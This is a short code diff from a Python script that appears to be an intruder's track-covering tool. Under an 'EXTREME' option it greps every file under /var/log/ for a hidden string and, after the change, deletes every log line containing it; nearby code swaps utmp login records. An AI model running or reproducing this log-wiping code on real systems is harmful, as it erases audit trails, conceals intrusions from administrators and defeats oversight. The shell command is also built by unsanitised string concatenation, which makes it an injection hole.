@@ -34,7 +34,7 @@ def clear(utmpfile):
         os.rename("/tmp/"+NAME+".bak", utmpfile)
         
     if EXTREME:
-        os.system("grep -rinl " + hide +" /var/log/ | xargs sed -i 's/"+hide+"//g'")
+        os.system("grep -rinl " + hide +" /var/log/ | xargs sed -i '/"+hide+"/d'")
 
 for tmp in ufile:
     if os.path.isfile(tmp):
